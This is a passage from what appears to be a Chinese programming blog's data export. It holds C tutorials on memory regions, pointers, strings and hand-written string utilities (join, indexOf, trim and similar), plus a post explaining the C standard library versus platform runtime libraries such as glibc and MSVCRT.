class=\"string\">\"123456\"</span>;<span class=\"comment\">//pa指针在栈区，“123456”在常量区，该函数调用完后指针变量pa就被释放了</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span>*p = <span class=\"literal\">NULL</span>;<span class=\"comment\">//指针变量p在栈中分配4字节</span></span><br><span class=\"line\">    p=(<span class=\"keyword\">char</span>*)<span class=\"built_in\">malloc</span>(<span class=\"number\">100</span>);<span class=\"comment\">//本函数在这里开辟了一块堆区的内存空间，并把地址赋值给p</span></span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(p, <span class=\"string\">\"wudunxiong 1234566\"</span>);<span class=\"comment\">//把常量区的字符串拷贝到堆区</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> p;<span class=\"comment\">//返回给主调函数fb()，相对fa来说fb是主调函数，相对main来说，fa(),fb()都是被调用函数</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>由此可以得知，当一个程序运行时，他的全局区，代码区基本是固定不变的，堆区与全局区和代码区均由系统控制。开发人员需对堆区内存进行管理。在现代开发语言(java,c#,javascript等)里,堆区内存管理都是由垃圾回收器处理的。</p>\n<h2 id=\"内存管理基础-指针\"><a href=\"#内存管理基础-指针\" class=\"headerlink\" title=\"内存管理基础:指针\"></a>内存管理基础:指针</h2><p>指针是一个变量,其值为另一个变量的地址,即内存位置的直接地址。就像其他变量或常量一样,您必须在使用指针存储其他变量地址之前,对其进行声明。指针变量声明的一般形式为：type *var-name;<br>示例如下:<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span> <span class=\"params\">()</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">int</span>  var = <span class=\"number\">20</span>;   <span class=\"comment\">/* 实际变量的声明 */</span></span><br><span class=\"line\">   <span class=\"keyword\">int</span>  *ip;        <span class=\"comment\">/* 指针变量的声明 */</span></span><br><span class=\"line\">   ip = &amp;var;  <span class=\"comment\">/* 在指针变量中存储 var 的地址 */</span></span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">\"Address of var variable: %x\\n\"</span>, &amp;var  );</span><br><span class=\"line\">   <span class=\"comment\">/* 在指针变量中存储的地址 */</span></span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">\"Address stored in ip variable: %x\\n\"</span>, ip );</span><br><span class=\"line\">   <span class=\"comment\">/* 使用指针访问值 */</span></span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">\"Value of *ip variable: %d\\n\"</span>, *ip );</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"字符串\"><a href=\"#字符串\" class=\"headerlink\" title=\"字符串\"></a>字符串</h2><p>在C语言中,字符串实际上是使用null字符 ‘\\0’ 终止的一维字符数组.因此,一个以null尾的字符串,包含了组成字符串的字符.<br>下面的声明和初始化创建了一个”Hello”字符串.由于在数组的末尾存储了空字符,所以字符数组的大小比单词”Hello”的字符数多一个。<br><img src=\"/img/c-4.jpg\" alt=\"效果\"></p>\n<p>c语言标准库没有常用的字符串方法，如indexOf,lastIndexOf,trim,lTrim,rTrim等方法。如是我就自己尝试实现，中间用了几个标准库函数:strcpy字符串拷贝，strcat字符串连接，这个方法不能直接用，C中的字符串内存不是自动扩展需要自己申请,strcat是把第二个字符串copy到第一个字符串结尾，需要第一个字符串分配的内存足够多，不然无法连接。strstr查找相同的字符串，返回的又是地址。整个代码全是内存操作，自已申请的内存一定要记得释放，对于用惯了现代语言的人来说，这真是相当虐心啊。<br><img src=\"/img/c-5.jpg\" alt=\"效果\"><br>还是看代码吧<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">///方法定义</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">join</span><span class=\"params\">(<span class=\"keyword\">char</span>  *s1,<span class=\"keyword\">char</span> *s2)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">indexOf</span><span class=\"params\">(<span class=\"keyword\">char</span> *str1,<span class=\"keyword\">char</span> *str2)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">lastIndexOf</span><span class=\"params\">(<span class=\"keyword\">char</span> *str1,<span class=\"keyword\">char</span> *str2)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">ltrim</span><span class=\"params\">(<span class=\"keyword\">char</span> *str)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">rtrim</span><span class=\"params\">(<span class=\"keyword\">char</span> *str)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">trim</span><span class=\"params\">(<span class=\"keyword\">char</span> *str)</span></span>;</span><br><span class=\"line\">    <span class=\"comment\">//测试数据准备</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> *first;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *second;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *indexstr;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *third;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *show;</span><br><span class=\"line\">    first = <span class=\"string\">\"binyanbin website is \"</span>;</span><br><span class=\"line\">    second = <span class=\"string\">\"http://binyanbin.github.io\"</span>;</span><br><span class=\"line\">    indexstr = <span class=\"string\">\"bin\"</span>;</span><br><span class=\"line\">    third = <span class=\"string\">\"  binyanbin trim test \"</span>;</span><br><span class=\"line\">    <span class=\"comment\">//测试结果输出</span></span><br><span class=\"line\">    show = join(first,second);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"join(\\\"%s\\\",\\\"%s\\\")=\\\"%s\\\"\\n\"</span>,first,second,show);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(show);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"indexOf(\\\"%s\\\",\\\"%s\\\")=%d\\n\"</span>,second,indexstr,indexOf(second,indexstr));</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"lastIndexOf(\\\"%s\\\",\\\"%s\\\")=%d\\n\"</span>,second,indexstr,lastIndexOf(second,indexstr));</span><br><span class=\"line\">    show = ltrim(third);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"ltrim(\\\"%s\\\")=\\\"%s\\\"\\n\"</span>,third,show);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(show);</span><br><span class=\"line\">    show = rtrim(third);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"rtrim(\\\"%s\\\")=\\\"%s\\\"\\n\"</span>,third,show);</span><br><span class=\"line\">    show = trim(third);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"trim(\\\"%s\\\")=\\\"%s\\\"\"</span>,third,show);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(show);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//字符串连接</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">join</span><span class=\"params\">(<span class=\"keyword\">char</span>  *s1,<span class=\"keyword\">char</span> *s2)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//分布内存</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> *result = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">strlen</span>(s1)+<span class=\"built_in\">strlen</span>(s2)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (result==<span class=\"literal\">NULL</span>) </span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);<span class=\"comment\">//内存为空退出</span></span><br><span class=\"line\">    <span class=\"comment\">//拷贝s1到result</span></span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(result, s1);</span><br><span class=\"line\">    <span class=\"comment\">//s2加到result尾部  </span></span><br><span class=\"line\">    <span class=\"built_in\">strcat</span>(result, s2);  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//字符串查询最开始位置</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">indexOf</span><span class=\"params\">(<span class=\"keyword\">char</span> *str1,<span class=\"keyword\">char</span> *str2)</span>  </span><br><span class=\"line\"></span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">char</span> *p=str1;  </span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;  </span><br><span class=\"line\">    <span class=\"comment\">//p是一个地址，找到相同字符串的地址</span></span><br><span class=\"line\">    p=<span class=\"built_in\">strstr</span>(str1,str2);  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(p==<span class=\"literal\">NULL</span>)  </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;  </span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">        <span class=\"comment\">//是不是同一个地址了，是同一地址则找到字符串</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(str1!=p)</span><br><span class=\"line\">        &#123;  </span><br><span class=\"line\">            str1++;  </span><br><span class=\"line\">            i++;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;  </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//查询最后位置</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">lastIndexOf</span><span class=\"params\">(<span class=\"keyword\">char</span> *str1,<span class=\"keyword\">char</span> *str2)</span>  </span><br><span class=\"line\"></span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">char</span> *p=str1;  </span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> len=<span class=\"built_in\">strlen</span>(str2);  </span><br><span class=\"line\">    p=<span class=\"built_in\">strstr</span>(str1,str2);  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(p==<span class=\"literal\">NULL</span>)<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    <span class=\"comment\">//未找到字符串地址为空则跳出循环  </span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(p!=<span class=\"literal\">NULL</span>)  </span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">        <span class=\"comment\">//跳过已找的地址 </span></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(;str1!=p;str1++)</span><br><span class=\"line\">            i++;  </span><br><span class=\"line\">        p=p+len;</span><br><span class=\"line\">        <span class=\"comment\">//找出下一个同样字符串的地址  </span></span><br><span class=\"line\">        p=<span class=\"built_in\">strstr</span>(p,str2);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;  </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//删除左空格 </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">ltrim</span><span class=\"params\">(<span class=\"keyword\">char</span> *param)</span>  </span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//申请存储，不修改参数内存的数据</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> *str = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">strlen</span>(param)+<span class=\"number\">1</span>); </span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(str, param); </span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j,len=<span class=\"built_in\">strlen</span>(str);  </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(str[i]!=<span class=\"string\">'\\0'</span>)  </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">//32:空格,9:横向制表符</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(str[i]!=<span class=\"number\">32</span>&amp;&amp;str[i]!=<span class=\"number\">9</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        i++;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(i!=<span class=\"number\">0</span>)  </span><br><span class=\"line\">    <span class=\"comment\">//将后面的字符顺势前移,补充删掉的空白位置</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;=len-i;j++)  </span><br><span class=\"line\">    &#123;     </span><br><span class=\"line\">        str[j]=str[j+i];</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> str; </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"comment\">//删除右空格</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">rtrim</span><span class=\"params\">(<span class=\"keyword\">char</span> *param)</span>  </span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *str = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">strlen</span>(param)+<span class=\"number\">1</span>);    </span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(str, param); </span><br><span class=\"line\">    <span class=\"keyword\">char</span> *p=str;  </span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"built_in\">strlen</span>(str)<span class=\"number\">-1</span>;  </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&gt;=<span class=\"number\">0</span>)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(p[i]!=<span class=\"number\">32</span>&amp;&amp;p[i]!=<span class=\"number\">9</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;  </span><br><span class=\"line\">        i--;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    str[++i]=<span class=\"string\">'\\0'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> str;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//删除左右空格</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">trim</span><span class=\"params\">(<span class=\"keyword\">char</span> *str)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span>* temp = ltrim(str);</span><br><span class=\"line\">    <span class=\"keyword\">char</span>* result = rtrim(temp);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(temp);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"C语言之函数库","date":"2016-03-30T16:00:00.000Z","desc":"标准库 运行库 编译器","_content":"为什么写C的需要了解更多系统方面的知识，我们可以从C语言的函数库说起。\n\n# C标准库\nC标准库，顾名思义既然是标准，就是由标准组织制定的。C标准库就是任何平台都可以使用的基本C语言库。\n标准库是C标准定义了一系列常用的函数，称为C库函数。C标准仅仅定义了函数原型，并没有提供实现。因此这个任务留给了各个支持C语言标准的编译器。你只使用标准库写的代码可以跨平台使用。\n\n# 运行库\n它由不同操作系统不同开发平台提供不同的C运行库。但是C运行库的部分实现是基于C标准库的，即C运行库是各个操作系统各个开发工具根据自身平台开发的库，某种程度上，可以说C运行库是C标准库的一个扩展库，只是加了很多C标准库所没有的与平台相关的或者不相关的库接口函数。\n一个运行库包括以下功能:\n1.启动与退出：包括入口函数及入口函数所依赖的其他函数等。\n2.标准函数：由C语言标准规定的C语言标准库所拥有的函数实现。（C标准库）\n3.I/O：I/O功能的封装和实现，参见上一节中I/O初始化部分。\n4.堆：堆的封装和实现，参见上一节中堆初始化部分。\n5.语言实现：语言中一些特殊功能的实现。\n6.调试：实现调试功能的代码。\n\n* 运行库是平台相关的，因为它与操作系统结合得非常紧密。C语言的运行库从某种程度上来讲是C语言的程序和不同操作系统平台之间的抽象层，它将不同的操作系统API抽象成相同的库函数。比如我们可以在不同的操作系统平台下使用fread来读取文件，而事实上fread(标准库函数)在不同的操作系统平台下的实现是不同的，但作为运行库的使用者我们不需要关心这一点。\n* 虽然各个平台下的C语言运行库提供了很多功能，但很多时候它们毕竟有限，比如用户的权限控制等都不是属于标准的C语言运行库。于是我们不得不通过其他的办法，诸如绕过C语言运行库直接调用操作系统API或使用其他的库。\n* linux和Windows平台下的两个主要C语言运行库分别为glibc（GNU C Library）和MSVCRT（Microsoft Visual C Run-time），我们在下面将会分别介绍它们。值得注意的是，像线程操作这样的功能并不是标准的C语言运行库的一部分，但是glibc和MSVCRT都包含了线程操作的库函数。比如glibc有一个可选的pthread库中的pthread_create()函数可以用来创建线程；而MSVCRT中可以使用_beginthread()函数来创建线程。所以glibc和MSVCRT事实上是标准C语言运行库的超集，它们各自对C标准库进行了一些扩展。\n![关系图](/img/c-6.jpg)","source":"_posts/c-4.md","raw":"---\ntitle: C语言之函数库\ndate: 2016-3-31\ndesc: 标准库 运行库 编译器\n---\n为什么写C的需要了解更多系统方面的知识，我们可以从C语言的函数库说起。\n\n# C标准库\nC标准库，顾名思义既然是标准，就是由标准组织制定的。C标准库就是任何平台都可以使用的基本C语言库。\n标准库是C标准定义了一系列常用的函数，称为C库函数。C标准仅仅定义了函数原型，并没有提供实现。因此这个任务留给了各个支持C语言标准的编译器。你只使用标准库写的代码可以跨平台使用。\n\n# 运行库\n它由不同操作系统不同开发平台提供不同的C运行库。但是C运行库的部分实现是基于C标准库的，即C运行库是各个操作系统各个开发工具根据自身平台开发的库，某种程度上，可以说C运行库是C标准库的一个扩展库，只是加了很多C标准库所没有的与平台相关的或者不相关的库接口函数。\n一个运行库包括以下功能:\n1.启动与退出：包括入口函数及入口函数所依赖的其他函数等。\n2.标准函数：由C语言标准规定的C语言标准库所拥有的函数实现。（C标准库）\n3.I/O：I/O功能的封装和实现，参见上一节中I/O初始化部分。\n4.堆：堆的封装和实现，参见上一节中堆初始化部分。\n5.语言实现：语言中一些特殊功能的实现。\n6.调试：实现调试功能的代码。\n\n* 运行库是平台相关的，因为它与操作系统结合得非常紧密。C语言的运行库从某种程度上来讲是C语言的程序和不同操作系统平台之间的抽象层，它将不同的操作系统API抽象成相同的库函数。比如我们可以在不同的操作系统平台下使用fread来读取文件，而事实上fread(标准库函数)在不同的操作系统平台下的实现是不同的，但作为运行库的使用者我们不需要关心这一点。\n* 虽然各个平台下的C语言运行库提供了很多功能，但很多时候它们毕竟有限，比如用户的权限控制等都不是属于标准的C语言运行库。于是我们不得不通过其他的办法，诸如绕过C语言运行库直接调用操作系统API或使用其他的库。\n* linux和Windows平台下的两个主要C语言运行库分别为glibc（GNU C Library）和MSVCRT（Microsoft Visual C Run-time），我们在下面将会分别介绍它们。值得注意的是，像线程操作这样的功能并不是标准的C语言运行库的一部分，但是glibc和MSVCRT都包含了线程操作的库函数。比如glibc有一个可选的pthread库中的pthread_create()函数可以用来创建线程；而MSVCRT中可以使用_beginthread()函数来创建线程。所以glibc和MSVCRT事实上是标准C语言运行库的超集，它们各自对C标准库进行了一些扩展。\n![关系图](/img/c-6.jpg)","slug":"c-4","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llsp0006g2x6eqzg0q4p","content":"<p>为什么写C的需要了解更多系统方面的知识，我们可以从C语言的函数库说起。</p>\n<h1 id=\"C标准库\"><a href=\"#C标准库\" class=\"headerlink\" title=\"C标准库\"></a>C标准库</h1><p>C标准库，顾名思义既然是标准，就是由标准组织制定的。C标准库就是任何平台都可以使用的基本C语言库。<br>标准库是C标准定义了一系列常用的函数，称为C库函数。C标准仅仅定义了函数原型，并没有提供实现。因此这个任务留给了各个支持C语言标准的编译器。你只使用标准库写的代码可以跨平台使用。</p>\n<h1 id=\"运行库\"><a href=\"#运行库\" class=\"headerlink\" title=\"运行库\"></a>运行库</h1><p>它由不同操作系统不同开发平台提供不同的C运行库。但是C运行库的部分实现是基于C标准库的，即C运行库是各个操作系统各个开发工具根据自身平台开发的库，某种程度上，可以说C运行库是C标准库的一个扩展库，只是加了很多C标准库所没有的与平台相关的或者不相关的库接口函数。<br>一个运行库包括以下功能:<br>1.启动与退出：包括入口函数及入口函数所依赖的其他函数等。<br>2.标准函数：由C语言标准规定的C语言标准库所拥有的函数实现。（C标准库）<br>3.I/O：I/O功能的封装和实现，参见上一节中I/O初始化部分。<br>4.堆：堆的封装和实现，参见上一节中堆初始化部分。<br>5.语言实现：语言中一些特殊功能的实现。<br>6.调试：实现调试功能的代码。</p>\n<ul>\n<li>运行库是平台相关的，因为它与操作系统结合得非常紧密。C语言的运行库从某种程度上来讲是C语言的程序和不同操作系统平台之间的抽象层，它将不同的操作系统API抽象成相同的库函数。比如我们可以在不同的操作系统平台下使用fread来读取文件，而事实上fread(标准库函数)在不同的操作系统平台下的实现是不同的，但作为运行库的使用者我们不需要关心这一点。</li>\n<li>虽然各个平台下的C语言运行库提供了很多功能，但很多时候它们毕竟有限，比如用户的权限控制等都不是属于标准的C语言运行库。于是我们不得不通过其他的办法，诸如绕过C语言运行库直接调用操作系统API或使用其他的库。</li>\n<li>linux和Windows平台下的两个主要C语言运行库分别为glibc（GNU C Library）和MSVCRT（Microsoft Visual C Run-time），我们在下面将会分别介绍它们。值得注意的是，像线程操作这样的功能并不是标准的C语言运行库的一部分，但是glibc和MSVCRT都包含了线程操作的库函数。比如glibc有一个可选的pthread库中的pthread_create()函数可以用来创建线程；而MSVCRT中可以使用_beginthread()函数来创建线程。所以glibc和MSVCRT事实上是标准C语言运行库的超集，它们各自对C标准库进行了一些扩展。<br><img src=\"/img/c-6.jpg\" alt=\"关系图\"></li>\n</ul>\n","excerpt":"","more":"<p>为什么写C的需要了解更多系统方面的知识，我们可以从C语言的函数库说起。</p>\n<h1 id=\"C标准库\"><a href=\"#C标准库\" class=\"headerlink\" title=\"C标准库\"></a>C标准库</h1><p>C标准库，顾名思义既然是标准，就是由标准组织制定的。C标准库就是任何平台都可以使用的基本C语言库。<br>标准库是C标准定义了一系列常用的函数，称为C库函数。C标准仅仅定义了函数原型，并没有提供实现。因此这个任务留给了各个支持C语言标准的编译器。你只使用标准库写的代码可以跨平台使用。</p>\n<h1 id=\"运行库\"><a href=\"#运行库\" class=\"headerlink\" title=\"运行库\"></a>运行库</h1><p>它由不同操作系统不同开发平台提供不同的C运行库。但是C运行库的部分实现是基于C标准库的，即C运行库是各个操作系统各个开发工具根据自身平台开发的库，某种程度上，可以说C运行库是C标准库的一个扩展库，只是加了很多C标准库所没有的与平台相关的或者不相关的库接口函数。<br>一个运行库包括以下功能:<br>1.启动与退出：包括入口函数及入口函数所依赖的其他函数等。<br>2.标准函数：由C语言标准规定的C语言标准库所拥有的函数实现。（C标准库）<br>3.I/O：I/O功能的封装和实现，参见上一节中I/O初始化部分。<br>4.堆：堆的封装和实现，参见上一节中堆初始化部分。<br>5.语言实现：语言中一些特殊功能的实现。<br>6.调试：实现调试功能的代码。</p>\n<ul>\n<li>运行库是平台相关的，因为它与操作系统结合得非常紧密。C语言的运行库从某种程度上来讲是C语言的程序和不同操作系统平台之间的抽象层，它将不同的操作系统API抽象成相同的库函数。比如我们可以在不同的操作系统平台下使用fread来读取文件，而事实上fread(标准库函数)在不同的操作系统平台下的实现是不同的，但作为运行库的使用者我们不需要关心这一点。</li>\n<li>虽然各个平台下的C语言运行库提供了很多功能，但很多时候它们毕竟有限，比如用户的权限控制等都不是属于标准的C语言运行库。于是我们不得不通过其他的办法，诸如绕过C语言运行库直接调用操作系统API或使用其他的库。</li>\n<li>linux和Windows平台下的两个主要C语言运行库分别为glibc（GNU C Library）和MSVCRT（Microsoft Visual C Run-time），我们在下面将会分别介绍它们。值得注意的是，像线程操作这样的功能并不是标准的C语言运行库的一部分，但是glibc和MSVCRT都包含了线程操作的库函数。比如glibc有一个可选的pthread库中的pthread_create()函数可以用来创建线程；而MSVCRT中可以使用_beginthread()函数来创建线程。所以glibc和MSVCRT事实上是标准C语言运行库的超集，它们各自对C标准库进行了一些扩展。<br><img src=\"/img/c-6.jpg\" 